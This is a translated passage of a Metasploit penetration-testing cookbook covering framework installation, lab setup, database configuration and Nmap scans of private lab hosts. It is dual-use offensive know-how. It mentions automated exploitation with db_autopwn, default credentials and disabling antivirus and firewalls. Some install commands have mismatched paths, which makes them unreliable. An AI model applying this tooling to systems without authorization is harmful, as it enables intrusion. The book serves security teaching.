# Metasploit 渗透测试秘籍（一）

> 原文：[`annas-archive.org/md5/5103BA072B171774B556C75B597E241F`](https://annas-archive.org/md5/5103BA072B171774B556C75B597E241F)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

渗透测试是当今网络安全的核心方面之一。它涉及通过实施现实生活中的安全测试对系统进行全面分析。它有助于识别系统主要组件中可能存在的潜在弱点，这些弱点可能出现在硬件或软件中。渗透测试成为安全的重要方面的原因是它有助于从黑客的角度识别威胁和弱点。可以实时利用漏洞来确定漏洞的影响，然后可以探索适当的补救措施或补丁，以保护系统免受外部攻击并减少风险因素。

决定渗透测试可行性的最大因素是对目标系统的了解。当对目标用户没有先验知识时，实施黑盒渗透测试。渗透测试人员将不得不从头开始收集有关目标系统的每一点信息，以实施攻击。在白盒测试中，了解目标的完整知识，并且测试人员将不得不识别可能存在的任何已知或未知的弱点。这两种渗透测试方法都同样困难，并且是特定于环境的。行业专业人员已经确定了几乎所有形式的渗透测试中必不可少的一些关键步骤。这些是：

+   **目标发现和枚举：**在不与目标进行任何物理连接的情况下识别目标并收集基本信息

+   **漏洞识别：**实施各种发现方法，如扫描、远程登录和网络服务，以确定目标系统上运行的不同服务和软件

+   **利用：**利用目标系统上运行的任何软件或服务中已知或未知的漏洞

+   攻击后的控制级别：这是攻击者在成功利用后可以在目标系统上获得的访问级别

+   **报告：**准备有关漏洞及其可能的对策的咨询

这些步骤可能看起来很少，但实际上对于运行着许多服务的高端系统的完整渗透测试可能需要数天甚至数月才能完成。使渗透测试成为耗时任务的原因是它基于“试错”技术。利用和漏洞在很大程度上取决于系统配置，因此我们无法确定特定的利用是否成功，除非我们尝试。考虑一下利用运行着 10 个不同服务的基于 Windows 的系统的例子。渗透测试人员将不得不确定这 10 个不同服务是否存在任何已知的漏洞。一旦它们被识别出来，利用的过程就开始了。这只是一个考虑了一个系统的小例子。如果我们有一个整个网络的这样的系统需要逐个渗透呢？

这就是渗透测试框架发挥作用的地方。它们自动化了测试的几个过程，如扫描网络、根据可用服务及其版本识别漏洞、自动利用等。它们通过为测试人员提供一个完整的控制面板来加速渗透测试过程，从而使其能够有效地管理所有活动并监视目标系统。渗透测试框架的另一个重要好处是报告生成。它们自动化了保存渗透测试结果并生成报告的过程，这些报告可以保存以供以后使用，也可以与远程工作的其他同事共享。

《Metasploit 渗透测试食谱》旨在帮助读者掌握当今场景中最广泛使用的渗透测试框架之一。Metasploit 框架是一个开源平台，可帮助创建真实的利用场景以及渗透测试的其他核心功能。本书将带您进入探索 Metasploit 世界的激动人心之旅，以及如何使用它执行有效的渗透测试。本书还将涵盖一些其他在框架上运行的扩展工具，并增强其功能，以提供更好的渗透测试体验。

# 本书内容

第一章，“安全专业人员的 Metasploit 快速技巧”，是进入 Metasploit 和渗透测试世界的第一步。本章介绍了框架的基本概念、架构和库。为了开始渗透测试，我们需要一个设置，因此本章将指导您通过使用虚拟机设置自己的虚拟渗透测试环境。随后，本章讨论了在不同操作系统上安装框架。本章以介绍 Metasploit 的第一次体验和其界面为结束。

第二章，“信息收集和扫描”，是渗透测试的第一步。它从最传统的信息收集方式开始，然后进一步使用 Nmap 进行扫描。本章还涵盖了一些额外的工具，如 Nessus 和 NeXpose，它们通过提供额外信息来弥补 Nmap 的局限性。最后，本章讨论了 Dradis 框架，这是渗透测试人员广泛使用的工具，用于与其他远程测试人员分享他们的测试结果和报告。

第三章，“基于操作系统的漏洞评估和利用”，讨论了在目标系统上运行的未打补丁的操作系统中发现漏洞。基于操作系统的漏洞具有很高的成功率，并且可以很容易地被利用。本章讨论了渗透几种流行的操作系统，如 Windows XP、Windows 7 和 Ubuntu。本章涵盖了这些操作系统的一些流行和已知的漏洞利用，以及它们如何在 Metasploit 中被用来入侵目标机器。

第四章，“客户端利用和防病毒绕过”，将我们的讨论推进到下一步，讨论了如何使用 Metasploit 执行客户端利用。本章涵盖了一些流行的客户端软件，如 Microsoft Office、Adobe Reader 和 Internet Explorer。随后，本章详细讨论了如何杀死客户端防病毒保护，以防止在目标系统中引起警报。

第五章，“使用 Meterpreter 探索受损目标”，讨论了利用后的下一步。Meterpreter 是一个后渗透工具，具有多种功能，可以帮助渗透受损目标并获取更多信息。本章涵盖了一些有用的渗透测试技术，如提权、访问文件系统和键盘记录。

第六章，“高级 Meterpreter 脚本”，通过涵盖一些高级主题，如构建我们自己的 meterpreter 脚本和使用 API mixins，将我们的 Metasploit 知识提升到了一个新的水平。本章将为读者提供灵活性，因为他们可以根据情景将自己的脚本实现到框架中。本章还涵盖了一些高级后利用概念，如枢轴、传递哈希和持久连接。

第七章，“渗透测试模块的使用”，将我们的焦点转移到 Metasploit 的另一个重要方面；它的模块。Metasploit 有一个相当不错的特定模块集合，可以在特定场景下使用。本章涵盖了一些重要的辅助模块，然后进一步讲解如何构建我们自己的 Metasploit 模块。本章需要一些基本的 Ruby 脚本知识。

第八章，“使用利用”，通过讨论如何将任何利用转换为 Metasploit 模块，为我们的武器库增添了最后一件武器。这是一个高级章节，将使读者能够构建自己的 Metasploit 利用模块并将其导入框架。由于并非所有利用都包含在框架中，因此本章在我们想要测试不在 Metasploit 存储库中的利用时非常有用。本章还讨论了一些模糊模块，这些模块对于构建任何漏洞的自己的概念验证非常有用。最后，本章以一个完整的示例结束，介绍了如何模糊应用程序以找到溢出条件，然后为其构建一个 Metasploit 模块。

第九章，“使用 Armitage”，是关于流行的 Metasploit 扩展 Armitage 的简要讨论。它为框架提供了图形界面，并通过提供点对点的利用选项来增强其功能。本章重点介绍了 Armitage 的重要方面，如快速查找漏洞、处理多个目标、在选项卡之间切换以及处理后利用。

第十章，“社会工程师工具包”，是本书的最后讨论部分，涵盖了框架的另一个重要扩展。社会工程师工具包（SET）用于生成依赖于人类疏忽以侵入目标的测试案例。本章涵盖了与 SET 相关的基本攻击向量，包括鱼叉式网络钓鱼、网站攻击向量、生成可感染的媒体，如 USB。

# 本书需要什么

要遵循和重现本书的配方，您将需要两个系统。一个可以是您的渗透测试系统，另一个可以是您的目标系统。或者，您也可以使用单个系统，并使用任何虚拟化软件设置渗透测试环境。

除此之外，您还需要一个预先安装了 Metasploit 和本书将讨论的其他工具的 BackTrack 5 的 ISO 镜像。或者，您可以从其官方网站单独为您喜欢的操作系统下载 Metasploit 框架。

# 本书适合谁

本书旨在面向专业的渗透测试人员，以及愿意掌握这一工具的新用户。书中内容适合各种读者。本书采用了易于阅读、理解和回忆的配方结构。书籍从渗透测试的基础知识开始，然后逐渐深入到专家级别。初学者到高级水平的过渡非常顺畅。因此，所有类别的读者都可以轻松阅读和理解本书。本书需要基本的扫描、利用和 Ruby 语言知识。

# 约定

在本书中，您会发现一些文本样式，用于区分不同类型的信息。以下是一些样式的示例，以及它们的含义解释。

文本中的代码单词显示如下："最后两个命令，`vulns`和`db_autopwn`是后期利用命令，我们将在后面的章节中讨论。"

代码块设置如下：

```
# Register command execution options
register_options(
[
OptString.new('USER', [ true, "The username to create", "metasploit" ]),
OptString.new('PASS', [ true, "The password for this user", "metasploit" ]),
], self.class)

```

任何命令行输入或输出都以以下形式编写：

```
$ chmod +x framework-4.*-linux-full.run
$ sudo ./framework-4.*-linux-full.run 

```

**新术语**和**重要单词**以粗体显示。例如，屏幕上显示的单词，菜单或对话框中的单词会以这种形式出现在文本中："您可以从**应用程序**菜单或命令行启动 Metasploit 框架"。

### 注意

警告或重要提示会以这种形式出现在一个框中。

### 提示

提示和技巧会以这种形式出现。


# 第一章：安全专业人员的 Metasploit 快速提示

在本章中，我们将涵盖：

+   在 Windows 上配置 Metasploit

+   在 Ubuntu 上配置 Metasploit

+   使用 BackTrack 5 的 Metasploit-终极组合

+   在单台机器上设置渗透测试实验室

+   在具有 SSH 连接性的虚拟机上设置 Metasploit

+   从接口开始- Metasploit 的“Hello World”

+   在 Metasploit 中设置数据库

+   使用数据库存储渗透测试结果

+   分析数据库中存储的结果

# 介绍

Metasploit 目前是信息安全和渗透测试领域最热门的词汇。它彻底改变了我们进行系统安全测试的方式。使 Metasploit 如此受欢迎的原因是它可以执行的任务范围广泛，以便于渗透测试工作，使系统更加安全。Metasploit 适用于所有流行的操作系统。框架的工作过程对所有操作系统几乎是相同的。在本书中，我们将主要使用 BackTrack 5 操作系统，因为它预装了 Metasploit 框架和其他在框架上运行的第三方工具。

让我们快速介绍一下框架和与之相关的各种术语：

+   **Metasploit 框架：**这是由 H.D. Moore 于 2003 年开始的免费、开源的渗透测试框架，后来被 Rapid7 收购。框架的当前稳定版本是用 Ruby 语言编写的。它拥有世界上最大的已测试利用数据库，每年下载量超过一百万次。这也是迄今为止用 Ruby 构建的最复杂的项目之一。

+   **漏洞：**这是一种允许攻击者/渗透测试者破坏/危害系统安全的弱点。这种弱点可以存在于操作系统、应用软件，甚至网络协议中。

+   **利用：**利用是一种允许攻击者/测试者利用脆弱系统并危害其安全性的代码。每个漏洞都有其对应的利用。Metasploit v4 有超过 700 个利用。

+   **有效载荷：**这是实际执行工作的代码。在利用后在系统上运行。它们主要用于在攻击者和受害者机器之间建立连接。Metasploit v4 有超过 250 个有效载荷。

+   **模块：**模块是完整系统的小构建块。每个模块执行特定任务，通过组合多个模块来构建一个完整的系统单元。这种架构的最大优势是，开发人员可以轻松地将新的利用代码和工具集成到框架中。

Metasploit 框架具有模块化架构，利用、有效载荷、编码器等被视为单独的模块。

![介绍](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_01_01.jpg)

让我们仔细研究架构图。

Metasploit 使用不同的库来确保框架的正常运行。这些库是一组预定义的任务、操作和函数，可以被框架的不同模块利用。框架最基本的部分是**Ruby 扩展（Rex）**库。Rex 提供的一些组件包括包装套接字子系统、协议客户端和服务器的实现、日志子系统、利用实用类以及其他一些有用的类。Rex 本身设计为没有依赖性，除了默认的 Ruby 安装。

然后我们有 MSF Core 库，它扩展了 Rex。 Core 负责实现所有必需的接口，允许与利用模块、会话和插件进行交互。这个核心库由框架基础库扩展，旨在为处理框架核心提供更简单的包装例程，并为处理框架的不同方面提供实用类，例如将模块状态序列化为不同的输出格式。最后，基础库由框架的**用户界面（UI）**扩展，实现对框架本身的不同类型用户界面的支持，例如命令控制台和 Web 界面。

框架提供了四种不同的用户界面，即`msfconsole、msfcli、msfgui`和`msfweb`。强烈建议您尝试所有这些不同的界面，但在本书中，我们将主要使用`msfconsole`界面。其背后的原因是`msfconsole`为框架提供了最好的支持，利用了所有功能。

现在让我们转向本章的实际分析和实际分析各个方面的配方。

# 在 Windows 上配置 Metasploit

在 Windows 上安装 Metasploit 框架非常简单，几乎不需要任何努力。框架安装程序可以从 Metasploit 官方网站（[`www.metasploit.com/download`](http://www.metasploit.com/download)）下载。

## 做好准备

您会注意到 Windows 有两种不同类型的安装程序可用。建议下载包含控制台和所有其他相关依赖项以及数据库和运行时设置的 Metasploit 框架的完整安装程序。如果您已经配置了要用于框架的数据库，那么可以选择仅安装控制台和依赖项的框架的迷你安装程序。

## 如何做...

一旦您完成了安装程序的下载，只需运行它并放松一下。它将自动安装所有相关组件并为您设置数据库。安装完成后，您可以通过安装程序创建的各种快捷方式访问框架。

## 它是如何工作的...

您会发现安装程序已经为您创建了许多快捷方式。在 Windows 环境中，大多数事情都是点击即可完成的。您会发现一些选项，如 Metasploit web、cmd 控制台、Metasploit 更新等。

### 注意

在 Windows 上安装 Metasploit 时，应禁用防病毒保护，因为它可能会检测到某些安装文件为潜在病毒或威胁，并可能阻止安装过程。安装完成后，请确保您已在防病毒软件中将框架安装目录列入白名单，因为它将检测到利用和有效载荷为恶意。

## 还有更多...

现在让我们谈谈一些其他选项，或者可能是一些与在 Windows 上明确安装 Metasploit 框架相关的一般信息。

### 安装过程中的数据库错误

在 Windows 机器上安装 Metasploit 框架时，许多用户都会遇到一个常见问题。在运行设置时，您可能会遇到错误消息，如屏幕截图所示：

![安装过程中的数据库错误](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_01_02.jpg)

这是在配置 PostgreSQL 服务器时出现错误的结果。可能的原因是：

+   PostgreSQL 未运行。使用 Netstat 查找端口是否打开并且数据库是否运行。

+   有些安装程序需要默认安装路径。例如，如果默认路径是`C`驱动器，将其更改为`D`驱动器将导致此错误。

+   语言编码。

如果您遇到此问题，可以通过下载仅包含控制台和依赖项的框架的简化版本来克服它。然后，手动配置数据库并将其连接到 Metasploit。

# 在 Ubuntu 上配置 Metasploit

Metasploit 框架完全支持基于 Ubuntu 的 Linux 操作系统。安装过程与 Windows 有些不同。

## 准备工作

从官方 Metasploit 网站（[`www.metasploit.com/download`](http://www.metasploit.com/download/)）下载设置。

同样，您可以选择最小安装或完整安装。根据您的需求选择下载。完整安装将包括所有依赖项、数据库设置、环境等，而最小安装将只包含依赖项，没有数据库设置。

## 如何做...

完整安装的过程与最小安装有些不同。让我们分析一下它们各自：

+   **完整安装程序：** 您需要执行以下命令在您的 Ubuntu 机器上安装框架：

```
$ chmod +x framework-4.*-linux-full.run
$ sudo ./framework-4.*-linux-full.run

```

+   **最小安装程序：** 您需要执行以下命令以最小选项安装框架：

```
$ chmod +x framework-4.*-linux-mini.run
$ sudo ./framework-4.*-linux-mini.run

```

## 它是如何工作的...

上面演示的安装过程是几乎所有软件的简单基于 Ubuntu 的安装过程。安装完成后，您可以运行`hash -r`重新加载您的路径。

### 注意

这个安装过程可以在几乎所有版本和版本的 Linux 上进行。

## 还有更多...

现在让我们谈谈其他一些选项，或者可能与此任务相关的一些一般信息。

### 安装过程中出现错误

有可能安装程序由于某种原因对您不起作用。某些版本的 Ubuntu 带有破损的 Ruby 语言库，这可能是安装失败的原因之一。在这种情况下，我们可以通过执行以下命令单独安装依赖项：

要安装 Ruby 依赖项，请运行：

```
$ sudo apt-get install ruby libopenssl-ruby libyaml-ruby libdl-ruby libiconv-ruby libreadline-ruby irb ri rubygems

```

要安装子版本客户端，请运行：

```
$ sudo apt-get install subversion

```

要构建本机扩展，请运行：

```
$ sudo apt-get install build-essential ruby-dev libpcap-dev

```

安装以下依赖项后，从官方 Metasploit 下载页面下载 Metasploit Unix tarball 并执行以下命令：

```
$ tar xf framework-4.X.tar.gz
$ sudo mkdir -p /opt/metasploit4
$ sudo cp -a msf4/ /opt/metasploit3/msf4
$ sudo chown root:root -R /opt/metasploit4/msf4
$ sudo ln -sf /opt/metasploit3/msf3/msf* /usr/local/bin/

```

在成功执行上述命令后，框架将启动并准备接收您的指令。

# Metasploit 与 BackTrack 5 的终极组合

BackTrack 是安全专业人员最受欢迎的操作系统，原因有两个。首先，它预先安装了所有流行的渗透测试工具，因此减少了单独安装的成本。其次，它是基于 Linux 的操作系统，这使得它不太容易受到病毒攻击，并在渗透测试期间提供更稳定性。它可以节省您安装相关组件和工具的时间，谁知道在安装过程中可能会遇到未知错误。

## 准备工作

您可以在硬盘上单独安装 BackTrack，也可以在虚拟机上使用。安装过程简单，与安装任何基于 Linux 的操作系统相同。

## 如何做...

1.  在启动 BackTrack OS 时，您将被要求输入用户名和密码。root 用户的默认用户名是`root`，密码是`toor`。

1.  成功登录后，您可以在命令行上工作，也可以输入`startx`进入 GUI 模式。

1.  您可以从**应用程序**菜单或命令行启动 Metasploit 框架。要从**应用程序**菜单启动 Metasploit，请转到**应用程序 | BackTrack | Exploitation Tools | Network Exploitation Tools | Metasploit Framework**，如下面的屏幕截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_01_03.jpg)

1.  Metasploit 遵循一个简单的目录结构层次，其中根文件夹是`pentest`。该目录进一步分支到`/exploits/framework3`。要从命令行启动 Metasploit，请启动终端并输入以下命令以移动到 Metasploit 目录：

```
root@bt:~# cd /pentest/exploits/framework3
root@bt:/pentest/exploits/framework3 ~# ./msfconsole

```

## 它是如何工作的...

从命令行启动 Metasploit 将遵循到`msfconsole`的完整路径。从**应用程序**菜单启动将为我们提供直接访问不同可用的 UI。

# 在单台机器上设置渗透测试实验室

您可以通过使用多台机器设置渗透测试实验室，这被认为是理想的设置。但是，如果您遇到紧急情况，需要立即设置测试场景，而您只有一台机器怎么办？使用虚拟机是显而易见的答案。您可以同时在多个操作系统上工作，并执行渗透测试任务。因此，让我们快速看一下如何借助虚拟机在单个系统上设置渗透测试实验室。

## 准备工作

我们将使用虚拟机设置两个虚拟机，分别运行 BackTrack 5 和 Windows XP SP2 操作系统。我们的主机系统是 Windows 7。我们需要虚拟机安装程序，以及两个操作系统的镜像文件或安装光盘。因此，我们的完整设置将包括运行 Windows 7 的主机系统，分别运行 BackTrack 5 和 Windows XP SP2 的两个虚拟系统。

## 如何做...

安装虚拟机的过程简单明了。按照以下步骤进行：

1.  安装虚拟机后，创建一个新的虚拟机。选择适当的选项，然后点击**下一步**。您将需要提供一个安装介质来启动设置。介质可以是镜像文件或安装光盘。有关虚拟机和安装程序的完整手册，您可以访问以下链接：[`www.virtualbox.org/manual/UserManual.html`](http://www.virtualbox.org/manual/UserManual.html)

1.  为了获得更好的虚拟机性能，建议 32 位操作系统至少有 4GB 可用 RAM，64 位操作系统至少有 8GB RAM。在下一个教程中，我将向您展示一种很酷的方法，可以在运行多个虚拟机时降低内存使用量。

1.  一旦创建了**虚拟机（VM）**，您可以使用“克隆”选项。这将创建您的 VM 的精确副本，因此如果操作 VM 中发生故障，您可以切换到克隆的 VM，而不必担心重新安装。您还可以使用“快照”选项保存 VM 的当前状态。快照将保存虚拟机的当前工作设置，您可以在将来的任何时间恢复到保存的快照。

## 它是如何工作的...

在启动虚拟机之前，我们需要进行重要的配置，以使两个虚拟机能够相互通信。选择其中一个虚拟机，点击**设置**。然后转到**网络设置**。在网络适配器中，将有一个预安装的 NAT 适配器用于主机机器的互联网使用。在**适配器 2**下选择**仅主机适配器**。

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_01_04.jpg)

对两个虚拟机都执行此过程。设置**仅主机适配器**的原因是使两个虚拟机能够相互通信。现在，为了测试一切是否正常，通过在命令提示符中输入`ipconfig`来检查 Windows 虚拟机的 IP 地址。现在从 BackTrack 机器上 ping Windows 机器（使用从`ipconfig`命令获取的本地 IP 地址），以查看它是否接收数据包。按照相反的过程来交叉检查两台机器。

## 还有更多...

现在让我们谈谈其他选项，或者可能与此任务相关的一些一般信息。

### 禁用防火墙和防病毒保护

有时我们可能会发现，当从 BackTrack 机器对 Windows 机器进行 ping 时，数据包没有收到。这意味着 Windows 机器已经关闭。这可能是由于默认的 Windows 防火墙设置。因此，禁用防火墙保护，然后再次 ping，看看数据包是否被接收。还要禁用虚拟机中可能安装的任何防火墙。

### 安装虚拟盒增强功能

虚拟盒提供了一个额外的插件安装，可以改善您的虚拟使用体验。它的一些关键好处是：

+   从主机操作系统到虚拟操作系统的无缝鼠标移动

+   自动键盘集成到虚拟操作系统

+   更好的屏幕尺寸

要安装增强功能，启动虚拟机，转到**设备**选项卡，然后点击**安装增强功能**。

# 在具有 SSH 连接的虚拟机上设置 Metasploit

在上一个步骤中，我们专注于使用虚拟化在单台机器上设置渗透测试实验室。但是在使用多个虚拟机时可能会出现严重的内存使用问题。因此，我们将讨论一种在困难时期非常有用的保护技术。

## 准备工作

我们只需要一个 SSH 客户端。我们将使用 PuTTY，因为它是 Windows 上最流行和免费的 SSH 客户端。我们将建立与 Backtrack 机器的 SSH 连接，因为它的内存消耗比 Windows XP 机器更大。

## 操作步骤...

1.  我们将首先启动我们的 BackTrack 虚拟机。在到达登录提示时，输入凭据启动命令行。现在不要启动 GUI。执行以下任一命令：

```
root@bt:~# /etc/init.d/start ssh
root@bt:~# start ssh

```

这将启动 BackTrack 机器上的 SSH 进程。

1.  现在通过输入以下命令找到机器的 IP 地址：

```
root@bt:~# ifconfig

```

记下这个 IP 地址

1.  现在在主机操作系统上启动 PuTTY。输入 BackTrack 虚拟机的 IP 地址并输入端口`22`：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_01_05.jpg)

1.  现在点击**打开**以启动命令行。如果连接成功，您将看到 PuTTY 命令行代表 BackTrack 机器运行。它会要求您登录。输入凭据并输入`ifconfig`来检查 IP 是否与虚拟 BackTrack 的 IP 相同：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_01_06.jpg)

## 工作原理...

在这个 SSH 会话中，我们现在可以使用 PuTTY 与 BackTrack 虚拟机进行交互。由于 GUI 没有加载，内存消耗几乎减少了一半。此外，最小化 BackTrack 虚拟机将进一步减少内存消耗，因为 Windows 操作系统为最小化的进程提供较少的内存份额，并提供正在最大化模式下运行的任务更快的执行。这将进一步在一定程度上减少内存消耗。

# 从接口开始，Metasploit 的“Hello World”

接口为用户与软件或平台进行通信提供了一个前端。Metasploit 有四个接口，即`msfgui, msfweb, msfcli`和`msfconsole`。强烈建议您检查所有接口，但在本书中，我们将主要关注`msfconsole`接口。它是其中最强大和完全集成的接口。

## 准备工作

启动已安装 Metasploit 的操作系统。如果您在虚拟机上使用它，请启动它。

## 操作步骤...

启动`msfconsole`是一项简单的任务。按照以下步骤进行：

1.  对于 Windows 操作系统，可以通过**开始 | metasploit framework | msfconsole**来启动`msfconsole`。

1.  对于 BackTrack，您可以浏览到**应用程序 | 渗透测试工具 | 网络渗透测试工具 | Metasploit 框架 | msfconsole**。

1.  直接从终端启动它，添加以下命令：

```
root@bt:~# cd /pentest/exploits/framework3

```

1.  工作目录将更改为`framework3`。输入以下命令将启动我们的`msfconsole`：

```
root@bt:/pentest/exploits/framework3# ./msfconsole

```

现在，我们的`msfconsole`界面已经启动并运行，准备接收命令。

## 它是如何工作的...

Metasploit 接口扩展了基本库，使它们能够调用框架的初始功能。可以执行简单的命令，例如设置利用和有效载荷、运行更新和配置数据库。一旦过程变得更深入，其他功能库将相应地被调用。

## 还有更多...

让我们添加一些您可以在此阶段使用`msfconsole`界面执行的其他内容。

### 一些要尝试并开始的命令

以下是一些您可以尝试以深入探索的命令：

+   `msf > ls：` `ls`命令将列出所有可用的目录和文件。您可以进一步深入其他目录以进行更深入的探索。

+   `msf > help：`此命令将列出我们可以使用的 Metasploit 框架的所有可用命令。这些命令被分类为核心命令和数据库后端命令。前者包含与框架直接相关的命令，而后者提供与数据库交互的命令。

+   `msf > msfupdate：`应经常使用此命令，以便使用最新的利用、有效载荷、库等更新框架。

# 在 Metasploit 中设置数据库

Metasploit 的一个重要特性是存在数据库，您可以使用它来存储渗透测试结果。任何渗透测试都包含大量信息，可能持续几天，因此存储中间结果和发现变得至关重要。因此，一个好的渗透测试工具应该具有适当的数据库集成，以快速有效地存储结果。

## 准备就绪

Metasploit 默认使用 PostgreSQL 作为数据库。对于 BackTrack 机器，我们还有另一个选择—MySQL。您可以使用这两个数据库中的任何一个。让我们首先检查 PostgreSQL 数据库的默认设置。我们将不得不导航到`opt/framework3/config`下的`database.yml`。要做到这一点，请运行以下命令：

```
root@bt:~# cd /opt/framework3/config
root@bt:/opt/framework3/config# cat database.yml
production: adapter: postgresql database: msf3 username: msf3 password: 8b826ac0 host: 127.0.0.1 port: 7175 pool: 75 timeout: 5

```

注意已创建的默认用户名、密码和默认数据库。记下这些值，因为它们将进一步需要。您也可以根据自己的选择更改这些值。

## 如何做...

现在我们的工作是连接数据库并开始使用它。让我们启动`msfconsole`，看看我们如何设置数据库并存储我们的结果。

让我们首先检查可用的数据库驱动程序。

```
msf > db_driver
[*]Active Driver: postgresql
[*]Available: postgresql, mysql

```

PostgreSQL 被设置为默认数据库。如果要更改数据库驱动程序，则可以执行以下命令：

```
Msf> db_driver mysql
[*]Active Driver: Mysql

```

这将把活动驱动程序更改为 MySQL。在本书中，我们主要将使用 PostgreSQL 进行演示。

### 注意

Rapid7 在最近的 Metasploit 版本中放弃了对 MySQL 数据库的支持，因此`db_driver`命令可能无法工作。在这种情况下，框架支持的唯一默认驱动程序将是 PostgreSQL。

## 它是如何工作的...

要将驱动程序连接到`msfconsle`，我们将使用`db_connect`命令。此命令将使用以下语法执行：

```
db_connect username:password@hostIP:port number/database_name 

```

在这里，我们将使用从`database.yml`文件中刚刚记录下的相同默认值的用户名、密码、数据库名称和端口号：

```
msf > db_connect msf3:8b826ac0@127.0.0.1:7175/msf3

```

成功执行命令后，我们的数据库将被完全配置。

## 还有更多...

让我们讨论一些与建立数据库相关的更重要的事实。

### 在连接数据库时出现错误

在尝试建立连接时可能会出现错误。如果出现任何错误，有两件事需要记住：

+   检查`db_driver`和`db_connect`命令，并确保您使用正确的数据库组合。

+   使用`start/etc/init.d`启动数据库服务，然后尝试连接它。

如果错误仍然存在，我们可以使用以下命令重新安装数据库和相关库：

```
msf> gem install postgres
msf> apt-get install libpq-dev

```

### 删除数据库

随时可以删除创建的数据库并重新开始存储新的结果。可以执行以下命令来删除数据库：

```
msf> db_destroy msf3:8b826ac0@127.0.0.1:7175/msf3
Database "msf3" dropped.
msf>

```

# 使用数据库存储渗透测试结果

现在让我们学习如何使用配置好的数据库来存储我们的渗透测试结果。

## 准备工作

如果您已成功执行了前面的步骤，那么您已经准备好使用数据库来存储结果了。在`msfconsole`中输入`help`命令，快速查看我们可以使用的重要数据库命令。

## 如何做...

让我们从一个快速示例开始。`db_nmap`命令将端口扫描的结果直接存储到数据库中，同时包括所有相关信息。在目标机器上启动一个简单的 Nmap 扫描，看看它是如何工作的：

```
msf > db_nmap 192.168.56.102
[*] Nmap: Starting Nmap 5.51SVN ( http://nmap.org ) at 2011-10-04 20:03 IST
[*] Nmap: Nmap scan report for 192.168.56.102
[*] Nmap: Host is up (0.0012s latency)
[*] Nmap: Not shown: 997 closed ports
[*] Nmap: PORT STATE SERVICE
[*] Nmap: 135/tcp open msrpc
[*] Nmap: 139/tcp open netbios-ssn
[*] Nmap: 445/tcp open microsoft-ds
[*] Nmap: MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems)
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds

```

正如我们所看到的，Nmap 已经生成了扫描结果，并且将自动填充我们正在使用的`msf3`数据库。

我们还可以在 Nmap 扫描中使用`-oX`参数将结果存储为 XML 格式。这对我们来说将非常有益，可以将扫描结果导入其他第三方软件，比如我们将在下一章中分析的 Dardis 框架。

```
msf > nmap 192.168.56.102 -A -oX report
[*] exec: nmap 192.168.56.102 -A -oX report
Starting Nmap 5.51SVN ( http://nmap.org ) at 2011-10-05 11:57 IST
Nmap scan report for 192.168.56.102
Host is up (0.0032s latency)
Not shown: 997 closed ports
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
MAC Address: 08:00:27:34:A8:87 (Cadmus Computer Systems)
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds

```

这里`report`是我们扫描结果将被存储的文件名。这将有助于我们在本书的后续步骤中。

## 工作原理...

`db_nmap`命令创建一个包含与扫描结果相关的各种表列的 SQL 查询。一旦扫描完成，它就开始将值存储到数据库中。以电子表格形式存储结果的灵活性使得更容易在本地或与第三方工具共享结果。

# 分析数据库中存储的结果

在数据库中存储测试结果之后，下一步是对其进行分析。分析数据将使我们更深入地了解我们的目标系统。数据库的结果可以根据使用情况长期或短期存储。

## 准备工作

启动`msfconsole`，并按照前面的步骤建立数据库连接。我们既可以用它来存储新的结果，也可以分析之前存储的结果。在前面的步骤中创建的 Nmap 扫描的 XML 文件可以导入以分析之前的扫描结果。

## 如何做...

让我们分析一些重要的命令，以更清楚地了解存储的结果:

+   `msf > hosts:` 这个命令将显示数据库中所有可用的主机。让我们分析一下这个命令的输出:![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_01_07.jpg)

前面的屏幕截图反映了主机命令的输出。正如我们所观察到的，这个命令的结果并不是很清晰，因为表中有很多列。因此，我们可以继续添加过滤器，并只查看我们感兴趣的那些列，如下面的命令所示：

```
msf > hosts -c address,os_name
Hosts 
===== 
address os_name 
------- ------ 
192.168.56.1 
192.168.56.101 
192.168.56.102 Microsoft Windows 
192.168.56.103 Linux 

```

+   `msf > services:` 这是另一个有趣的命令，可以为我们提供有关目标机器上运行的不同服务的有用信息:

```
msf > services
Services 
======== 
host port proto name state info 
---- ---- ----- ---- ----- ---- 
192.168.56.101 111 tcp rpcbind open 
192.168.56.102 135 tcp msrpc open 
192.168.56.102 139 tcp netbios-ssn open 
192.168.56.102 445 tcp microsoft-ds open 
192.168.56.102 135 tcp msrpc open Microsoft Windows 
RPC

```

+   `msf > vulns:` 这个命令列出了数据库中存在的所有主机的漏洞。

+   `msf > db_autopwn:` 这是一个强大的命令，用于自动化利用数据库中可用的目标机器的过程。这个命令需要更多关于利用过程的理解，所以我们稍后会分析这个命令。

## 工作原理...

分析过程简单，可以轻松过滤以获得所需的结果。我们已经看到了如何读取数据库输出以及如何有效地管理它。最后两个命令`vulns`和`db_autopwn`是后期利用命令，我们将在后面的章节中处理。


# 第二章：信息收集和扫描

在本章中，我们将涵盖：

+   被动信息收集 1.0-传统方式

+   被动信息收集 2.0-下一个级别

+   端口扫描-Nmap 方式

+   探索用于扫描的辅助模块

+   使用辅助模块进行目标服务扫描

+   使用 Nessus 进行漏洞扫描

+   使用 NeXpose 进行扫描

+   使用 Dradis 框架共享信息

# 介绍

信息收集是渗透测试的第一步基本步骤。这一步是为了尽可能多地了解目标机器的信息。我们拥有的信息越多，就越有可能利用目标。在信息收集阶段，我们的主要重点是收集有关目标机器的事实，比如 IP 地址、可用服务、开放端口。这些信息在渗透测试过程中起着至关重要的作用。信息收集中基本上使用了三种类型的技术。

